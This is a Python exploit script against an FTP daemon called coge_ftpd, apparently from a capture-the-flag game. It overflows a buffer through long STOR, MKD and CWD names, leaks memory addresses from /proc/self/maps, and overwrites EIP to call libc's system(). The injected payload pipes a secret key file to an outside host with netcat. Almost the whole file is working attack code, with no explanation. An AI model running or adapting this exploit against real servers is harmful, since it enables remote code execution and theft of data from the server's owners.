import os
import time
import struct
from socket import *
import thread

# defines
HOST = "192.168.100.38"
PORT = 21
DELAY = 0.5

FIRST_EIP = struct.pack("<I", 0x0804c72b)	# call parse_cmd, FIXED

STACK = 0xbf90c000		# YOU SHOULD CALC THIS
# bfd53000-bfd68000 rw-p 00000000 00:00 0          [stack]

SYSTEM = struct.pack("<I", 0xb79200)		# YOU SHOULD CALC THIS
# 00b3e000-00cce000 r-xp 00000000 fd:00 395780     /lib/libc-2.12.so

CMD = ";cat /home/coge_ftpd/S3cr3t_K3y_F1l3_15_H3r3 | nc 192.168.100.42 8383;"

def receiver(s):
	while(1):
		try:
			data = s.recv(1024)
		except:
			exit()
		print data
		time.sleep(0.5)

is_first = 1
while 1:
	# connect to the server
	s = socket(AF_INET, SOCK_STREAM)
	try:
		s.connect((HOST, PORT))
	except:
		print "cannot connect"
		exit()

	# socket receiver
	thread.start_new_thread(receiver, (s,))
	time.sleep(DELAY)

	# login first
	s.send("USER anonymous\n")
	time.sleep(DELAY)
	s.send("PASS xxx\n")
	time.sleep(DELAY)
	s.send("PORT 192,168,100,42,4,4\n")
	time.sleep(DELAY)

	# make long filename + big size to overflow
	
	os.system("killall -9 nc")

	if is_first:
		os.system("dd if=/dev/zero of=bigfile bs=10000000 count=1")
		os.system("nc -lv 1028 < bigfile &")
		time.sleep(DELAY)
		s.send("STOR " + "A"*(255-12) + "\n")
		time.sleep(5)
		is_first = 0

	os.system("nc -lv 1028 &")
	time.sleep(DELAY)

	s.send("LIST\n")
	time.sleep(DELAY)
	
	os.system("nc -lv 1028 &")
	time.sleep(DELAY)

	s.send("RETR /proc/self/maps\n")
	time.sleep(DELAY)

	# go to long directory

	s.send("MKD " + "A"*255 + "\n")
	s.send("CWD " + "A"*255 + "\n")
	time.sleep(DELAY)

	# 127.0.0.1
	# 192.168.100.42
	payload = "A"*29 + FIRST_EIP
	s.send("MKD " + payload + "\n")
	time.sleep(DELAY)
	s.send("CWD " + payload + "\n")
	time.sleep(DELAY)

	# QUIT to change FIRST_EIP
	s.send("QUIT\n")

	# attack!

	STACK = STACK - 0x100 

	print "stack : %x" % STACK
	STACK_pack = struct.pack("<I", STACK)           # YOU SHOULD CALC THIS

	s.send("C"*512 + "\x00\x00\x00\x00" + "\x90"*20 + SYSTEM + "AAAA" + STACK_pack + "A"*256 + CMD + "\x00\n")
	time.sleep(DELAY)

	#exit(0)
